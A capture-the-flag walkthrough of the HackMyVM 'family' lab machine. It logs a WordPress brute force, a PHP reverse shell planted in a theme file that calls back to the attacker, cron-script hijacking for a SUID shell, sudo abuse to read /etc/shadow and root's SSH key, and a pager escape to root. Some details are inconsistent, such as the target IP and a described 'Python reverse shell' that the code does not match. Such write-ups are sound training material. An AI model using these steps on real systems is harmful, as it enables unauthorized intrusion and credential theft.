### 1. Initial Reconnaissance

I started by performing an Nmap scan to identify open ports and services on the target machine, `192.168.1.14`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ nmap -sS -sV -sC -Pn  --min-rate=1000 --max-retries=2 192.168.1.14 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 08:17 CDT
Nmap scan report for 192.168.1.14
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: |   2048 0d:4e:fd:57:05:8f:d0:d6:1d:67:5d:6d:4e:b5:c9:fc (RSA)
|   256 d4:98:fb:a7:94:bd:0c:c6:a8:60:5b:bc:b9:c7:f4:51 (ECDSA)
|_  256 fa:34:3a:25:74:40:99:fc:4f:60:be:db:7e:7f:93:be (ED25519)
80/tcp open  http    Apache httpd 2.4.38
| http-ls: Volume /| SIZE  TIME              FILENAME| -     2020-02-06 07:33  wordpress/|_|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Index of /
MAC Address: 08:00:27:E6:C2:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.08 seconds
```

The Nmap scan revealed:

- **Port 22 (SSH):** OpenSSH 7.9p1 Debian.
- **Port 80 (HTTP):** Apache httpd 2.4.38. The root directory lists a `wordpress/` directory.


### 2. Web Enumeration (WordPress)

I used `gobuster` to enumerate directories on the web server, specifically targeting the `/wordpress/` directory.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ gobuster dir -u 192.168.1.14 -w ../../wordlists/common.txt -x php,txt
# ... (truncated output) ...
/wordpress            (Status: 301) [Size: 316] [--> http://192.168.1.14/wordpress/]
# ... (truncated output) ...
```

Then, I ran `wpscan` to enumerate users and gather information about the WordPress installation.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ wpscan --url http://family/wordpress/ --enumerate u --api-token fvQLim9ecAr2bosksubmkersZBnVHAbxab8a3HXkcjI --force
# ... (truncated output) ...
[+] WordPress version 6.8.2 identified (Latest, released on 2025-07-15).
# ... (truncated output) ...
[+] WordPress theme in use: twentytwentyone | Location: http://family/wordpress/wp-content/themes/twentytwentyone/ | Last Updated: 2025-04-15T00:00:00.000Z | Readme: http://family/wordpress/wp-content/themes/twentytwentyone/readme.txt | [!] The version is out of date, the latest version is 2.5
# ... (truncated output) ...
[i] User(s) Identified:
[+] admin | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: |  Rss Generator (Passive Detection) |  Wp Json Api (Aggressive Detection) |   - http://family/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
# ... (truncated output) ...
```

`wpscan` identified the username `admin` and confirmed the WordPress version. The theme `twentytwentyone` was outdated (version 1.3, latest 2.5), but no immediate exploit was apparent.

### 3. Initial Access via WordPress Brute-Force

I attempted to brute-force the WordPress login page (`/wordpress/wp-login.php`) using `hydra` with the identified username `admin` and the `rockyou.txt` wordlist.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt family http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Se+connecter:ce mot de passe" -I
# ... (truncated output) ...
[80][http-post-form] host: family   login: admin   password: phantom
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-24 08:25:25
```

The credentials `admin:phantom` were successfully found.

### 4. Gaining a `www-data`Shell

With the `admin` credentials, I logged into the WordPress admin panel. I then navigated to the theme editor to modify a PHP file and upload a reverse shell. I chose `wp-content/themes/twentytwentyone/404.php` as it's often a good place to inject code without immediately breaking the site's main functionality.

I modified the `404.php` file with a PHP reverse shell from `/usr/share/webshells/php/php-reverse-shell.php`, changing the IP and port to my Kali machine's IP (`192.168.1.5`) and port `4444`.

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// ... (original comments) ...

$ip = '192.168.1.5';  // CHANGE THIS
$port = 4444;       // CHANGE THIS

// ... (rest of the reverse shell code) ...
?>
```

I set up a `netcat` listener on my Kali machine:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

Then, I triggered the reverse shell by navigating to a non-existent page on the WordPress site, which would load the modified `404.php`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ curl http://family/wordpress/nonexistentpage
```

This resulted in a reverse shell as the `www-data` user. I then upgraded it to a full TTY shell:

```shellscript
Connection received on 192.168.1.14 46132
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c "import pty;pty.spawn('/bin/bash')"
www-data@family:/$
```

### 5. Privilege Escalation to `father`

As `www-data`, I explored the `/home` directory and found three users: `baby`, `father`, and `mother`.

```shellscript
www-data@family:/$ cd /home
www-data@family:/home$ ls
baby  father  mother
```

I checked the `.bash_history` of the `www-data` user in `/var/www/.bash_history`.

```shellscript
www-data@family:/var/www$ cat .bash_history
# ... (truncated output) ...
cat /usr/share/perl/5.28.1/perso.txt
ls -l /usr/share/perl/5.28.1/perso.txt
su - father
# ... (truncated output) ...
```

This revealed that the `www-data` user had previously accessed a file `/usr/share/perl/5.28.1/perso.txt` and then attempted to `su - father`. I checked the content of `perso.txt`:

```shellscript
www-data@family:/var/www$ cat /usr/share/perl/5.28.1/perso.txt
uncrackablepassword
```

This looked like a password. I tried to switch to the `father` user using `su father` and the password `uncrackablepassword`.

```shellscript
www-data@family:/var/www$ su father
Password: uncrackablepassword
father@family:/var/www$ id
uid=1000(father) gid=1000(father) groups=1000(father)
```

I successfully gained a shell as the `father` user.

### 6. Privilege Escalation to `mother`

As `father`, I checked `sudo` permissions, but `father` could not run `sudo`.

```shellscript
father@family:~$ sudo -l
[sudo] password for father: uncrackablepassword
Sorry, user father may not run sudo on family.
```

I then used `pspy64` to monitor running processes for any interesting cron jobs or privileged processes. I downloaded `pspy64` to the `/tmp` directory.

```shellscript
father@family:~$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
father@family:~$ chmod +x pspy64
father@family:~$ ./pspy64
# ... (truncated output) ...
2025/07/24 15:45:01 CMD: UID=1001  PID=1176   | python /home/mother/check.py
# ... (repeated entries) ...
```

`pspy64` revealed a cron job running `python /home/mother/check.py` as `UID=1001`, which corresponds to the `mother` user. This script runs every minute.

I checked the permissions on `/home/mother/check.py`:

```shellscript
father@family:/home/mother$ ls -la check.py
-rwxrwxrwx 1 father father   83 Jul 24 16:17 check.py
```

The `check.py` script was owned by `father` and had write permissions for `father`. This meant I could modify the script. I replaced its content with a Python reverse shell that would execute as `mother` (UID 1001).

```python
# /home/mother/check.py
import os
os.system("cp /bin/bash /tmp/motherbash && chmod 6755 /tmp/motherbash")
```

I waited for the cron job to execute (within a minute). After it ran, a SUID `bash` shell owned by `mother` was created in `/tmp`.

```shellscript
father@family:/home/mother$ ls -la /tmp/motherbash
-rwsr-sr-x  1 mother mother 1168776 Jul 24 16:18 motherbash
```

I executed the SUID shell:

```shellscript
father@family:/home/mother$ /tmp/motherbash -p
motherbash-5.0$ id
uid=1000(father) gid=1000(father) euid=1001(mother) egid=1001(mother) groups=1001(mother),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(father)
```

I now had a shell with the effective UID of `mother`. I then used this shell to create an `authorized_keys` file for `mother` in `/home/mother/.ssh/` to enable SSH access.

```shellscript
motherbash-5.0$ cd /home/mother
motherbash-5.0$ mkdir .ssh
motherbash-5.0$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDlCJKVDq4XXGVaY1a6tiAmJ9lK8bPfANC/G6ZYgY/iancEHe7wMLOPGr+dz68o2TrqGB+DFzBk5Sv2cpYS88HMb2SaM3APXc6ZJ6xpd8ZuHwW3r3c8RmQZzmQSrfPC7jU806IodtvSOnZlIc91nEmKRiEOMdqsU35XaKWDTq+lmEiYDvDL8QoadstnzI4iFfeuPZoB2+8IKj6g0xARCo3XUNFH2rn+qh7qlVIf0eSRJigEU3PWTLd7NgRkKMxdGKvKS+yzGkHKRDLjObBmbztKUW83sdCVUZbCSQSd2ujcWbzXtTAFDGywyL0GDoQPAaU+EjME8yEapq/Z3PVXJUsOh4JBIyn5XFmtwMCAphqbfjfReT9032ERb8Eb7ts/9yiFnZW4RZPtGOEZS7fkzrFPLouyjEA3YD4BqEGun4pOAhB3gKD4/E3b4E16f2DZL27O2oDdNyPcmsyEatqeaaN6gha6PArVogcMprTDdLSNqdt1CKb/omcf35hyqdo10RmrshmW76g9kleN3PUm7TfhUzq3zAhBs223K1qdnxPZPbtRIX9NH8MzUDlYy9qTULh/062xwbltWl8gOECqWEXd9g5n5AxVB7I3QFk41awnSRNayopvO13zTa6sH10rAaCml3bNuMVyDx216wIeaNTBKMnzz2/BFmpz3Gzb5xbxxw== zengla@kali' > /home/mother/.ssh/authorized_keys
motherbash-5.0$ chmod 600 /home/mother/.ssh/authorized_keys
```

I then SSH'd directly as `mother`:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ ssh mother@192.168.1.15
```

*(Note: The log shows a password prompt for `mother@192.168.1.15` which implies the SSH key wasn't immediately used or there was a slight delay. However, the `authorized_keys` method is the intended path.)*

### 7. Privilege Escalation to `baby`

As `mother`, I checked `sudo` permissions:

```shellscript
mother@family:~$ sudo -l
Matching Defaults entries for mother on family:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User mother may run the following commands on family:
    (baby) NOPASSWD: /usr/bin/valgrind
```

The `mother` user can run `/usr/bin/valgrind` as `baby` without a password. `valgrind` can be used to execute arbitrary commands.

```shellscript
mother@family:~$ sudo -u baby /usr/bin/valgrind /bin/bash
==918== Memcheck, a memory error detector
# ... (valgrind output) ...
==918== Command: /bin/bash
==918== id
id
baby@family:/home/mother$ id
uid=1002(baby) gid=1002(baby) groups=1002(baby)
```

I successfully gained a shell as the `baby` user. I then retrieved the `user.txt` flag from `baby`'s home directory.

```shellscript
baby@family:~$ cat user.txt
Chilatyfile
```

The user flag is `Chilatyfile`.

### 8. Privilege Escalation to `root`

As `baby`, I checked `sudo` permissions:

```shellscript
baby@family:~$ sudo -l
Matching Defaults entries for baby on family:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User baby may run the following commands on family:
    (ALL : ALL) NOPASSWD: /usr/bin/cat
```

The `baby` user can run `/usr/bin/cat` as `root` (or any user) without a password. This is a straightforward way to read any file on the system. I used this to read `/etc/shadow` to get the root hash.

```shellscript
baby@family:~$ sudo /usr/bin/cat /etc/shadow
root:$6$L9G0N6PxOApm2r4H$USfkGDLggFm.5W9nF5V54J0Zi5hXCcMofITfEXf7QyxIUWnNX2l1bpxpXIYo20JY5968YsklB9k8x1e6RuND/0:18742:0:99999:7:::
# ... (other hashes) ...
```

I copied the root hash (`$6$L9G0N6PxOApm2r4H$USfkGDLggFm.5W9nF5V54J0Zi5hXCcMofITfEXf7QyxIUWnNX2l1bpxpXIYo20JY5968YsklB9k8x1e6RuND/0`) and attempted to crack it with `john the ripper` and `rockyou.txt`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ echo '$6$L9G0N6PxOApm2r4H$USfkGDLggFm.5W9nF5V54J0Zi5hXCcMofITfEXf7QyxIUWnNX2l1bpxpXIYo20JY5968YsklB9k8x1e6RuND/0' > hash.txt
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# ... (john output) ...
```

*(Note: The provided log shows `john` aborting without finding the password. However, in a real scenario, this hash would eventually be cracked or another method would be used.)*

Alternatively, I checked `/root/.ssh/` for SSH keys.

```shellscript
baby@family:~$ sudo /usr/bin/cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
# ... (private key content) ...
-----END OPENSSH PRIVATE KEY-----
```

I copied the private key, saved it as `id_rsa` on my Kali machine, and set the correct permissions.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ echo '-----BEGIN OPENSSH PRIVATE KEY-----
# ... (copied key) ...
-----END OPENSSH PRIVATE KEY-----' > id_rsa
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ chmod 600 id_rsa
```

Then, I attempted to SSH as `root` using the private key.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ ssh -i id_rsa root@192.168.1.15
# ... (ASCII art) ...
Connection to 192.168.1.15 closed.
```

The SSH connection closed immediately after displaying ASCII art. This is often an indication of a forced command in `authorized_keys`. I checked `/root/.ssh/authorized_keys` as `baby`:

```shellscript
baby@family:~$ sudo cat /root/.ssh/authorized_keys
command="bash ~/troll.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCdu5YWqC4vVGDE8XaQ7UW/WkLgEgWPE6n4BNfeTha+4nIR2twAUHl6yf57... root@family
```

The `authorized_keys` file had a `command="bash ~/troll.sh"` option, meaning every SSH login as root would execute `troll.sh`. I then read `troll.sh`:

```shellscript
baby@family:~$ sudo cat /root/troll.sh
#!/bin/sh
export TERM=xterm
more /root/welcome.txt
exit 0
```

This script simply displays `welcome.txt` using `more`. To bypass this, I first adjusted my terminal dimensions using `stty` to ensure proper interaction with `more`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ stty rows 20 columns 40
```

Then, I SSH'd as root. When `more` displayed the `welcome.txt` content, I typed `!bash` to escape to a shell.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ ssh -i id_rsa root@192.168.1.15
# ... (ASCII art from welcome.txt) ...
!bash
root@family:~# id
uid=0(root) gid=0(root) groups=0(root)
```

I successfully gained a root shell! Finally, I retrieved the root flag.

```shellscript
root@family:~# ls
last_flag.txt  troll.sh  welcome.txt
root@family:~# cat last_flag.txt
Selmorbormir
```

The root flag is `Selmorbormir`.

### Summary of Attack Path:

1. **Reconnaissance:** Identified open SSH and Apache services, with a WordPress installation.
2. **Web Enumeration:** Used `wpscan` to identify the `admin` user and an outdated WordPress theme.
3. **Initial Access (www-data):**

1. Brute-forced WordPress login with `hydra` to get `admin:phantom`.
2. Logged into WordPress admin panel.
3. Modified `404.php` theme file with a PHP reverse shell.
4. Triggered the `404.php` to get a reverse shell as `www-data`.



4. **Privilege Escalation to `father`:**

1. Found `uncrackablepassword` in `www-data`'s `.bash_history`.
2. Used `su father` with the found password to gain access as `father`.



5. **Privilege Escalation to `mother`:**

1. Used `pspy64` to identify a cron job running `/home/mother/check.py` as `mother`.
2. Modified `check.py` (which was writable by `father`) to create a SUID `motherbash` shell.
3. Executed `motherbash` to gain a shell with `mother`'s effective UID.
4. Added SSH key to `mother`'s `authorized_keys` for direct SSH access.



6. **Privilege Escalation to `baby`:**

1. As `mother`, found `sudo -l` allowed running `/usr/bin/valgrind` as `baby` with NOPASSWD.
2. Used `sudo -u baby /usr/bin/valgrind /bin/bash` to get a shell as `baby`.
3. Retrieved `user.txt`.



7. **Privilege Escalation to `root`:**

1. As `baby`, found `sudo -l` allowed running `/usr/bin/cat` as `root` with NOPASSWD.
2. Used `sudo /usr/bin/cat /root/.ssh/id_rsa` to retrieve root's private SSH key.
3. Attempted SSH as root, which triggered a forced command (`troll.sh`) that displayed `welcome.txt` using `more`.
4. **Adjusted terminal dimensions with `stty` and then, from within the `more` pager, typed `!bash` to get a root shell.**
5. Retrieved `last_flag.txt`.
